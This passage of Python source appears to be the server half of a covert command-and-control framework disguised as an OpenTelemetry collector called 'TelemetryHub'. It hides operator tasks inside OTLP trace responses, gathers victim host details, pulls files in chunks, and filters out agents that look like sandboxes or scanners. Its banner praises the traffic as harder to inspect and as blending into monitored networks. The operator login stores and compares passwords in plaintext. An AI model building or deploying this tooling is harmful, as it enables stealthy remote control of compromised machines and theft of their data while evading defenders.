        if is_active and endpoint_obj:
            if "host.arch" in attrs:
                endpoint_obj.arch = attrs["host.arch"]
            if "os.type" in attrs:
                endpoint_obj.os = attrs["os.type"]
            if "user.name" in attrs:
                endpoint_obj.user = attrs["user.name"]
        else:
            # Update pending agent info - only update fields that are actually present
            if "host.arch" in attrs:
                update_pending_agent_info(endpoint_id, arch=attrs["host.arch"])
            if "os.type" in attrs:
                update_pending_agent_info(endpoint_id, os=attrs["os.type"])
            if "user.name" in attrs:
                update_pending_agent_info(endpoint_id, user=attrs["user.name"])

        # Extract results from span attributes
        for ss in rs.get("scopeSpans", []):
            for span in ss.get("spans", []):
                span_attrs = {a["key"]: a["value"].get("stringValue", "")
                             for a in span.get("attributes", [])}

                # Check for telemetry result in rotating attribute pairs
                result_attr, task_id_attr = find_data_in_rotating_attrs(span_attrs)

                # Also check legacy fixed attributes
                if not result_attr:
                    result_attr = span_attrs.get(ATTR_MAP['result']) or span_attrs.get("telemetry.result")
                    task_id_attr = span_attrs.get(ATTR_MAP['task_id']) or span_attrs.get("telemetry.id")

                if result_attr and task_id_attr:
                    task_id = task_id_attr
                    is_result_submission = True
                    task_obj = next((t for t in all_tasks if t.id == task_id), None)
                    if task_obj:
                        result_text = decode_data(result_attr, endpoint_id)
                        is_download = process_download_result(task_id, endpoint_id, result_text)

                        display_text = result_text
                        if result_text.startswith("C:"):
                            parts = result_text.split(":", 4)
                            if len(parts) >= 5:
                                chunk_idx, total, filename = parts[1], parts[2], parts[3]
                                display_text = f"Downloaded chunk {int(chunk_idx)+1}/{total} of {filename}"

                        results[task_id] = Result(task_id, endpoint_id, display_text, hidden=task_obj.hidden)
                        if not task_obj.hidden:
                            print(f"[HTTP OTLP] Result received: {task_id}" + (" (download)" if is_download else ""))
                        task_obj.status = "completed"

                # Check for sysinfo
                sysinfo_attr = None
                for data_attr, id_attr in ROTATING_ATTR_PAIRS:
                    if span_attrs.get(id_attr) == "init":
                        sysinfo_attr = span_attrs.get(data_attr)
                        break
                if not sysinfo_attr:
                    sysinfo_attr = span_attrs.get(ATTR_MAP['sysinfo'])
                if sysinfo_attr:
                    sysinfo_str = decode_data(sysinfo_attr, endpoint_id)
                    sysinfo_dict = {}
                    for pair in sysinfo_str.split(';'):
                        if '=' in pair:
                            k, v = pair.split('=', 1)
                            sysinfo_dict[k] = v

                    # Update either active endpoint or pending agent
                    if is_active and endpoint_obj:
                        endpoint_obj.os = sysinfo_dict.get("os", "Unknown")
                        endpoint_obj.arch = sysinfo_dict.get("arch", "Unknown")
                        endpoint_obj.user = sysinfo_dict.get("user", "Unknown")
                        endpoint_obj.hostname = sysinfo_dict.get("host", host)
                        endpoint_obj.ip_address = sysinfo_dict.get("ip", "Unknown")
                        endpoint_obj.elevated = sysinfo_dict.get("elevated", "false").lower() == "true"
                        print(f"[HTTP OTLP] Sysinfo updated: {endpoint_id[:16]}")
                    else:
                        # Store sysinfo for pending agent
                        update_pending_agent_info(endpoint_id,
                            os=sysinfo_dict.get("os", "Unknown"),
                            arch=sysinfo_dict.get("arch", "Unknown"),
                            user=sysinfo_dict.get("user", "Unknown"),
                            hostname=sysinfo_dict.get("host", host),
                            ip_address=sysinfo_dict.get("ip", "Unknown"),
                            elevated=sysinfo_dict.get("elevated", "false").lower() == "true"
                        )
                        print(f"[HTTP OTLP] Sysinfo stored for pending: {endpoint_id[:16]}")

                # Check for batch delay update
                for attr in span.get("attributes", []):
                    if attr.get("key") == "telemetry.sdk.batch_delay":
                        val = attr.get("value", {})
                        batch_ms = val.get("intValue") or val.get("stringValue")
                        if batch_ms:
                            try:
                                batch_sec = int(batch_ms) // 1000
                                if batch_sec > 0:
                                    if is_active and endpoint_obj:
                                        endpoint_obj.sleep_interval = batch_sec
                                        print(f"[HTTP OTLP] Batch delay updated: {endpoint_id[:16]} -> {batch_sec}s")
                                    else:
                                        update_pending_agent_info(endpoint_id, sleep_interval=batch_sec)
                            except (ValueError, TypeError):
                                pass

    # Build response - include tasks only for active agents on heartbeat requests
    # Don't include tasks if agent is pending or this is a result submission
    if is_result_submission or not should_deliver_tasks:
        # Don't include tasks in response to result submissions
        if PROTOBUF_AVAILABLE and 'protobuf' in content_type:
            empty_response = ExportTraceServiceResponse()
            return Response(
                content=empty_response.SerializeToString(),
                media_type="application/x-protobuf"
            )
        return {"partialSuccess": None}

    # Check for pending tasks
    task_payload = None
    if endpoint_id in task_queue and task_queue[endpoint_id]:
        queue = task_queue[endpoint_id]

        # Find first non-hidden task, or fall back to first task
        task_idx = 0
        for i, t in enumerate(queue):
            if not t.hidden:
                task_idx = i
                break

        task = queue.pop(task_idx)
        task.status = "delivered"

        # Build the task string
        task_str = task.type
        if task.args:
            try:
                decoded_args = [base64.b64decode(arg).decode() for arg in task.args]
                task_str = f"{task.type} {' '.join(decoded_args)}"
            except:
                task_str = f"{task.type} {' '.join(task.args)}"

        # Encrypt the task
        encrypted_task = encode_data(task_str, endpoint_id)
        task_payload = f"{task.id}:{encrypted_task}"

        otlp_stats["traces_sent"] += 1
        print(f"[HTTP OTLP] Task delivered: {task.id}")

    # Return response with task in partialSuccess.errorMessage
    if PROTOBUF_AVAILABLE and 'protobuf' in content_type:
        from opentelemetry.proto.collector.trace.v1.trace_service_pb2 import ExportTracePartialSuccess

        response = ExportTraceServiceResponse()
        if task_payload:
            response.partial_success.rejected_spans = 0
            response.partial_success.error_message = task_payload

        return Response(
            content=response.SerializeToString(),
            media_type="application/x-protobuf"
        )

    # JSON response
    if task_payload:
        return {
            "partialSuccess": {
                "rejectedSpans": 0,
                "errorMessage": task_payload
            }
        }
    return {"partialSuccess": None}


# ============================================================
# REST API ENDPOINTS (Operator UI)
# ============================================================

# Pydantic models for API
class TaskRequest(BaseModel):
    endpoint_id: str
    type: str
    args: List[str] = []
    operator_id: Optional[str] = None
    operator_name: Optional[str] = None

class LoginRequest(BaseModel):
    username: str
    password: str

class RegisterRequest(BaseModel):
    username: str
    password: str
    role: str = "Operator"

class TokenRequest(BaseModel):
    token: str

# ============================================================
# OPERATOR MANAGEMENT
# ============================================================

# Load operators from database
operators_db: Dict[str, dict] = load_operators_from_db()

# Active sessions: token -> operator info
active_sessions: Dict[str, dict] = {}

# Session validation dependency
async def validate_session(x_session_token: Optional[str] = Header(None)):
    """Validate session token from X-Session-Token header"""
    if not x_session_token:
        raise HTTPException(status_code=401, detail="Missing session token")
    if x_session_token not in active_sessions:
        raise HTTPException(status_code=401, detail="Invalid or expired session")
    return active_sessions[x_session_token]

@app.get("/api/operators")
async def list_operators(session: dict = Depends(validate_session)):
    """List all operators (without passwords)"""
    # Reload from database to get latest data
    global operators_db
    operators_db = load_operators_from_db()

    ops = []
    for username, op in operators_db.items():
        # Check if operator is online (has active session) and get login time
        is_online = False
        last_login = None
        for session in active_sessions.values():
            if session["operatorId"] == op["id"]:
                is_online = True
                last_login = session.get("loginTime")
                break
        # Count requests issued by this operator
        requests_issued = sum(1 for t in all_tasks if t.operator_id == op["id"])
        ops.append({
            "operatorId": op["id"],
            "operatorName": op["username"],
            "role": op["role"],
            "avatar": op["avatar"],
            "status": "online" if is_online else "offline",
            "requests_issued": requests_issued,
            "last_login": last_login,
            "created_at": op.get("created_at")
        })
    return {"operators": ops}

@app.post("/api/operators/login")
async def login_operator(req: LoginRequest):
    """Authenticate operator"""
    username = req.username.lower()

    if username not in operators_db:
        return {"success": False, "error": "Invalid credentials"}

    op = operators_db[username]
    if op["password"] != req.password:
        return {"success": False, "error": "Invalid credentials"}

    # Generate session token
    token = secrets.token_hex(32)

    # Store session
    active_sessions[token] = {
        "operatorId": op["id"],
        "operatorName": op["username"],
        "role": op["role"],
        "avatar": op["avatar"],
        "loginTime": datetime.now().isoformat()
    }

    print(f"[INFO] Operator authenticated: {username}")

    return {
        "success": True,
        "token": token,
        "operator": {
            "operatorId": op["id"],
            "operatorName": op["username"],
            "role": op["role"],
            "avatar": op["avatar"]
        }
    }

@app.post("/api/operators/logout")
async def logout_operator(req: TokenRequest):
    """Logout operator"""
    if req.token in active_sessions:
        op = active_sessions[req.token]
        print(f"[INFO] Operator session ended: {op['operatorName']}")
        del active_sessions[req.token]
        return {"success": True}
    return {"success": False, "error": "Invalid session"}

@app.post("/api/operators/heartbeat")
async def operator_heartbeat(req: TokenRequest):
    """Keep session alive"""
    if req.token in active_sessions:
        return {"success": True}
    return {"success": False, "error": "Session expired"}

@app.post("/api/operators/register")
async def register_operator(req: RegisterRequest, session: dict = Depends(validate_session)):
    """Register new operator"""
    global operators_db
    username = req.username.lower()

    if username in operators_db:
        return {"success": False, "error": "Username already exists"}

    op_id = f"op-{secrets.token_hex(3)}"
    avatar = str(len(operators_db) % 8 + 1)
    created_at = datetime.now().isoformat()

    # Save to database
    conn = get_db_connection()
    cursor = conn.cursor()
    try:
        cursor.execute('''
            INSERT INTO operators (id, username, password, role, avatar, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (op_id, username, req.password, req.role, avatar, created_at))
        conn.commit()
    except Exception as e:
        conn.close()
        return {"success": False, "error": str(e)}
    conn.close()

    # Update in-memory cache
    operators_db[username] = {
        "id": op_id,
        "username": username,
        "password": req.password,
        "role": req.role,
        "avatar": avatar,
        "created_at": created_at
    }

    print(f"[INFO] Operator registered: {username}")

    return {
        "success": True,
        "operator": {
            "operatorId": op_id,
            "operatorName": username,
            "role": req.role,
            "avatar": avatar,
            "created_at": created_at
        }
    }

@app.delete("/api/operators/{operator_id}")
async def delete_operator(operator_id: str, session: dict = Depends(validate_session)):
    """Remove operator"""
    global operators_db
    for username, op in list(operators_db.items()):
        if op["id"] == operator_id:
            # Delete from database
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute('DELETE FROM operators WHERE id = ?', (operator_id,))
            conn.commit()
            conn.close()

            # Remove from in-memory cache
            del operators_db[username]

            # Remove active sessions for this operator
            tokens_to_remove = [t for t, s in active_sessions.items() if s["operatorId"] == operator_id]
            for t in tokens_to_remove:
                del active_sessions[t]
            return {"success": True}
    return {"success": False, "error": "Operator not found"}


# ============================================================
# SERVER STATUS
# ============================================================

@app.get("/")
async def root():
    """Server status endpoint"""
    return {
        "name": "TelemetryHub Server",
        "version": "1.0.0",
        "status": "running",
        "endpoints_connected": len(endpoints),
        "tasks_pending": sum(len(q) for q in task_queue.values()),
        "protocol": "OTLP over HTTP"
    }


@app.get("/health")
async def health():
    """Health check endpoint (standard for OTel collectors)"""
    return {"status": "healthy"}


# --- Endpoint Management ---

@app.get("/api/endpoints")
async def list_endpoints(session: dict = Depends(validate_session)):
    """List all registered endpoints"""
    return {"endpoints": [e.to_dict() for e in endpoints.values()]}


# --- Suspicious Agents (Possible Scanners/Sandboxes) ---
# NOTE: These routes MUST come BEFORE /api/endpoints/{endpoint_id} to avoid path parameter matching

@app.get("/api/endpoints/suspicious")
async def list_suspicious_agents(session: dict = Depends(validate_session)):
    """
    List agents that haven't completed the lifecycle (possible scanners/sandboxes).

    These agents have connected but:
    - Haven't beaconed enough times (< MIN_BEACONS_FOR_ACTIVE)
    - Haven't been alive long enough (< MIN_LIFETIME_SECONDS)

    They will auto-expire after PENDING_TIMEOUT_SECONDS.
    """
    # Run cleanup first
    cleanup_expired_pending_agents()

    return {
        "suspicious_agents": [p.to_dict() for p in pending_agents.values()],
        "thresholds": {
            "min_beacons": MIN_BEACONS_FOR_ACTIVE,
            "min_lifetime_seconds": MIN_LIFETIME_SECONDS,
            "timeout_seconds": PENDING_TIMEOUT_SECONDS
        }
    }

@app.delete("/api/endpoints/suspicious/{agent_id}")
async def delete_suspicious_agent(agent_id: str, session: dict = Depends(validate_session)):
    """Manually remove a suspicious/pending agent"""
    if agent_id in pending_agents:
        del pending_agents[agent_id]
        return {"status": "deleted"}
    raise HTTPException(status_code=404, detail="Suspicious agent not found")

@app.post("/api/endpoints/suspicious/clear")
async def clear_suspicious_agents(session: dict = Depends(validate_session)):
    """Clear all suspicious/pending agents"""
    count = len(pending_agents)
    pending_agents.clear()
    return {"status": "cleared", "count": count}


# --- Endpoint by ID (must come AFTER /suspicious routes) ---

@app.get("/api/endpoints/{endpoint_id}")
async def get_endpoint(endpoint_id: str, session: dict = Depends(validate_session)):
    """Get specific endpoint details"""
    if endpoint_id not in endpoints:
        raise HTTPException(status_code=404, detail="Endpoint not found")
    return endpoints[endpoint_id].to_dict()


@app.delete("/api/endpoints/{endpoint_id}")
async def delete_endpoint(endpoint_id: str, session: dict = Depends(validate_session)):
    """Remove an endpoint"""
    if endpoint_id in endpoints:
        del endpoints[endpoint_id]
        if endpoint_id in task_queue:
            del task_queue[endpoint_id]
        return {"status": "deleted"}
    raise HTTPException(status_code=404, detail="Endpoint not found")


# --- Task Management ---

@app.post("/api/tasks")
async def send_task(req: TaskRequest, session: dict = Depends(validate_session)):
    """Queue a task for an endpoint"""
    if req.endpoint_id not in endpoints:
        raise HTTPException(status_code=404, detail="Endpoint not found")

    task_id = secrets.token_hex(4)
    task = Task(
        task_id=task_id,
        endpoint_id=req.endpoint_id,
        task_type=req.type,
        args=req.args,
        operator_id=req.operator_id,
        operator_name=req.operator_name
    )

    # Add to queue for OTLP delivery
    if req.endpoint_id not in task_queue:
        task_queue[req.endpoint_id] = []
    task_queue[req.endpoint_id].append(task)

    # Track in all_tasks for UI
    all_tasks.append(task)

    print(f"[INFO] Task queued: {task_id}")

    return {"id": task_id, "status": "queued"}


@app.get("/api/tasks")
async def list_tasks(session: dict = Depends(validate_session)):
    """List all tasks (excludes hidden tasks like download chunks)"""
    return {"tasks": [t.to_dict() for t in all_tasks if not t.hidden]}


# --- Results Management ---

@app.get("/api/results")
async def list_results(session: dict = Depends(validate_session)):
    """List all results (excludes hidden results like download chunks)"""
    return {"results": [r.to_dict() for r in results.values() if not r.hidden]}


@app.get("/api/results/{task_id}")
async def get_result(task_id: str, session: dict = Depends(validate_session)):
    """Get result for a specific task"""
    if task_id in results:
        return results[task_id].to_dict()
    raise HTTPException(status_code=404, detail="Result not found")


# --- File Downloads ---

@app.get("/api/downloads")
async def get_downloads(session: dict = Depends(validate_session)):
    """Get all downloaded files"""
    return [d.to_dict() for d in downloads.values()]

@app.get("/api/downloads/{file_id}")
async def get_download(file_id: str, session: dict = Depends(validate_session)):
    """Get specific download info"""
    if file_id in downloads:
        return downloads[file_id].to_dict()
    raise HTTPException(status_code=404, detail="Download not found")

@app.get("/api/downloads/{file_id}/content")
async def download_file_content(file_id: str, session: dict = Depends(validate_session)):
    """Download file content"""
    from fastapi.responses import FileResponse

    if file_id not in downloads:
        raise HTTPException(status_code=404, detail="Download not found")

    download = downloads[file_id]
    if download.status != "complete" or not download.local_path:
        raise HTTPException(status_code=400, detail="File not ready for download")

    if not os.path.exists(download.local_path):
        raise HTTPException(status_code=404, detail="File not found on disk")

    return FileResponse(
        path=download.local_path,
        filename=download.filename,
        media_type="application/octet-stream"
    )

@app.delete("/api/downloads/{file_id}")
async def delete_download(file_id: str, session: dict = Depends(validate_session)):
    """Delete a downloaded file"""
    if file_id not in downloads:
        raise HTTPException(status_code=404, detail="Download not found")

    download = downloads[file_id]

    # Delete file from disk if it exists
    if download.local_path and os.path.exists(download.local_path):
        try:
            os.remove(download.local_path)
        except Exception as e:
            print(f"[Download] Failed to delete file: {e}")

    # Remove from storage
    del downloads[file_id]
    if file_id in download_chunks:
        del download_chunks[file_id]

    return {"status": "deleted", "file_id": file_id}

class DownloadRequest(BaseModel):
    endpoint_id: str
    file_path: str

@app.post("/api/downloads/request")
async def request_download(req: DownloadRequest, session: dict = Depends(validate_session)):
    """Request a file download from an agent"""
    if req.endpoint_id not in endpoints:
        raise HTTPException(status_code=404, detail="Endpoint not found")

    # Create initial download task (will get metadata first)
    task = Task(
        task_id=secrets.token_hex(4),
        endpoint_id=req.endpoint_id,
        task_type="download",
        args=[base64.b64encode(req.file_path.encode()).decode()],
        operator_id="user",
        operator_name="User"
    )

    if req.endpoint_id not in task_queue:
        task_queue[req.endpoint_id] = []
    task_queue[req.endpoint_id].append(task)
    all_tasks.append(task)

    return {"status": "queued", "task_id": task.id, "file_path": req.file_path}


# --- Statistics ---

@app.get("/api/stats/otlp")
async def get_otlp_stats(session: dict = Depends(validate_session)):
    """Get OTLP protocol statistics"""
    return otlp_stats


@app.get("/api/stats/protocol")
async def get_protocol_stats(session: dict = Depends(validate_session)):
    """Get gRPC protocol statistics"""
    return {
        "protocol": "gRPC + Protobuf",
        "port": 4317,
        "grpc_requests": otlp_stats["grpc_requests"],
        "traces_received": otlp_stats["traces_received"],
        "traces_sent": otlp_stats["traces_sent"],
        "grpc_available": GRPC_AVAILABLE and PROTOBUF_AVAILABLE
    }


@app.post("/api/clear")
async def clear_all(session: dict = Depends(validate_session)):
    """Clear all endpoints, tasks, and results"""
    global endpoints, tasks, task_queue, results, all_tasks
    endpoints = {}
    tasks = {}
    task_queue = {}
    results = {}
    all_tasks = []
    return {"status": "cleared"}




# ============================================================
# TLS CERTIFICATE GENERATION
# ============================================================

def generate_self_signed_cert(cert_file: str, key_file: str):
    """Generate self-signed certificate for TLS"""
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        from cryptography.hazmat.backends import default_backend
        import datetime

        # Generate key
        key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )

        # Generate certificate
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "CA"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, "San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "OpenTelemetry Collector"),
            x509.NameAttribute(NameOID.COMMON_NAME, "otel-collector.local"),
        ])

        cert = x509.CertificateBuilder().subject_name(
            subject
        ).issuer_name(
            issuer
        ).public_key(
            key.public_key()
        ).serial_number(
            x509.random_serial_number()
        ).not_valid_before(
            datetime.datetime.now(datetime.timezone.utc)
        ).not_valid_after(
            datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365)
        ).add_extension(
            x509.SubjectAlternativeName([
                x509.DNSName("localhost"),
                x509.DNSName("otel-collector.local"),
                x509.IPAddress(ipaddress.ip_address("127.0.0.1")),
            ]),
            critical=False,
        ).sign(key, hashes.SHA256(), default_backend())

        # Write certificate
        with open(cert_file, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))

        # Write key
        with open(key_file, "wb") as f:
            f.write(key.private_bytes(
                encoding=serialization.Encoding.PEM,
                format=serialization.PrivateFormat.TraditionalOpenSSL,
                encryption_algorithm=serialization.NoEncryption()
            ))

        print(f"[INFO] Generated self-signed certificate: {cert_file}")
        return True

    except ImportError:
        print("[WARN] cryptography package not installed, cannot generate certificates")
        print("[WARN] Install with: pip install cryptography")
        return False


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    import argparse
    import ipaddress
    import os
    import sys
    import logging
    import signal
    import atexit

    # Suppress noisy Windows asyncio connection reset errors
    logging.getLogger("asyncio").setLevel(logging.CRITICAL)

    parser = argparse.ArgumentParser(description="TelemetryHub Server")
    parser.add_argument("--port", type=int, default=4318, help="HTTP server port (default: 4318)")
    parser.add_argument("--grpc-port", type=int, default=4317, help="gRPC server port (default: 4317)")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind (default: 0.0.0.0)")
    parser.add_argument("--tls", action="store_true", help="Enable TLS encryption")
    parser.add_argument("--cert", type=str, default="server.crt", help="TLS certificate file")
    parser.add_argument("--key", type=str, default="server.key", help="TLS private key file")
    parser.add_argument("--generate-cert", action="store_true", help="Generate self-signed certificate")
    parser.add_argument("--no-grpc", action="store_true", help="Disable gRPC server")
    parser.add_argument("--grpc-only", action="store_true", help="Only run gRPC server (no HTTP)")
    args = parser.parse_args()

    print("")
    print("  ╔═══════════════════════════════════════════════════════════╗")
    print("  ║           TelemetryHub Server - Dual Protocol             ║")
    print("  ╠═══════════════════════════════════════════════════════════╣")
    print(f"  ║  gRPC (Protobuf):  {'Enabled on port ' + str(args.grpc_port) if not args.no_grpc else 'Disabled':<35} ║")
    print(f"  ║  HTTP (JSON/PB):   {'Enabled on port ' + str(args.port) if not args.grpc_only else 'Disabled':<35} ║")
    print(f"  ║  TLS Encryption:   {'Enabled' if args.tls else 'Disabled':<35} ║")
    print("  ╚═══════════════════════════════════════════════════════════╝")
    print("")
    print("  gRPC+Protobuf advantages for research:")
    print("  • Binary protocol - harder to inspect than JSON")
    print("  • HTTP/2 multiplexing - complex traffic analysis")
    print("  • Standard SDK behavior - most OTel SDKs use gRPC")
    print("  • Enterprise expected - normal in monitored environments")
    print("")

    # Handle TLS
    ssl_keyfile = None
    ssl_certfile = None

    if args.tls:
        if args.generate_cert or not (os.path.exists(args.cert) and os.path.exists(args.key)):
            print("[INFO] Generating self-signed TLS certificate...")
            if not generate_self_signed_cert(args.cert, args.key):
                print("[ERROR] Failed to generate certificate. Running without TLS.")
                args.tls = False

        if args.tls:
            ssl_certfile = args.cert
            ssl_keyfile = args.key
            print(f"[INFO] TLS enabled with certificate: {args.cert}")

    # Register cleanup handler
    def cleanup():
        stop_grpc_server()

    atexit.register(cleanup)

    # Start gRPC server in background thread (if enabled)
    if not args.no_grpc and GRPC_AVAILABLE and PROTOBUF_AVAILABLE:
        print(f"[gRPC] Starting gRPC server on port {args.grpc_port}...")
        start_grpc_server(
            port=args.grpc_port,
            use_tls=args.tls,
            cert_file=args.cert if args.tls else None,
            key_file=args.key if args.tls else None
        )
        print(f"[gRPC] Server ready - accepting connections on :{args.grpc_port}")
    elif args.no_grpc:
        print("[INFO] gRPC server disabled via --no-grpc flag")
    else:
        print("[WARN] gRPC server not available - install grpcio and opentelemetry-proto")

    # Start HTTP server (or wait for gRPC only)
    if args.grpc_only:
        print("[INFO] Running in gRPC-only mode. Press Ctrl+C to stop.")
        try:
            while True:
                import time
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[INFO] Shutting down...")
            cleanup()
    else:
        print(f"[HTTP] Starting HTTP server on port {args.port}...")
        uvicorn.run(
            app,
            host=args.host,
            port=args.port,
            log_level="info",
            ssl_keyfile=ssl_keyfile,
            ssl_certfile=ssl_certfile
        )
